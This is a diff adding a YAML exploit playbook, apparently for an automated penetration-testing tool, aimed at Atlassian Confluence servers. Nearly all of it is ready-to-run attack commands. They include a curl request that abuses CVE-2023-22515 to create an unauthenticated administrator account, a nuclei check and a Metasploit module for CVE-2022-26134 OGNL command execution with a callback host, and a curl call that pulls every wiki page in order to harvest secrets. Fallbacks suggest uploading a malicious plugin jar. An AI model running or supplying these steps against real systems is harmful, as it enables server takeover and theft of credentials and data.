@@ -1,0 +1,38 @@
+id: tech_confluence
+title: "Confluence — OGNL injection (CVE-2022-26134) + auth bypass (CVE-2023-22515)"
+phase: exploit
+mitre: ["T1190"]
+trigger:
+  services: ["http", "https"]
+  ports:    [80, 443, 8080, 8090, 8443]
+  technologies: ["confluence", "atlassian"]
+  cves:     ["CVE-2022-26134", "CVE-2023-22515", "CVE-2023-22518", "CVE-2021-26084"]
+keywords: ["confluence", "ognl", "atlassian", "confluence rce"]
+preconditions:
+  - "/login.action OR /index.action reachable"
+steps:
+  - tool: curl
+    cmd:  "curl -s {base_url}/login.action | grep -oE 'Confluence [0-9.]+' | head -1"
+    why:  "Version banner via login page footer"
+  - tool: nuclei
+    cmd:  "nuclei -t http/cves/2022/CVE-2022-26134.yaml -u {base_url}"
+    why:  "CVE-2022-26134 OGNL injection — confirm anon command-execution via URL path (Confluence 1.3.0-7.18.0)"
+  - tool: curl
+    cmd:  "curl -sk -X POST '{base_url}/setup/setupadministrator.action' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=hacker&fullName=hacker&email=h@h.h&password=Pass1234!&confirm=Pass1234!&setup-next-button=Next'"
+    why:  "CVE-2023-22515 — broken access control creates admin without auth (Confluence Data Center 8.0.0-8.5.1)"
+  - tool: nuclei
+    cmd:  "nuclei -tags confluence -u {base_url}"
+    why:  "Sweep — CVE-2021-26084 (template injection), CVE-2023-22518, etc."
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/http/atlassian_confluence_namespace_ognl_injection; set RHOSTS {target}; set RPORT {port}; set TARGETURI /; set LHOST {LHOST}; run'"
+    why:  "Automated CVE-2022-26134 exploit module"
+  - tool: curl
+    cmd:  "curl -s '{base_url}/rest/api/content?expand=body.storage&limit=50' -H 'Authorization: Basic {b64creds}'"
+    why:  "Once authed (or with leaked token) → exfil all wiki pages including secrets/creds in body"
+expected_outcome: "Anon command-execution as confluence user; backup/restore takeover via CVE-2023-22518"
+fallbacks:
+  - "CVE-2023-22518 — restore as admin via SSRF-style backup endpoint"
+  - "Plugin exposed (universal-plugin-manager) → upload malicious .jar"
+  - "Backup files (`*.zip` exposed) → contain DB creds + hashed admin"
+references:
+  - "https://confluence.atlassian.com/security"
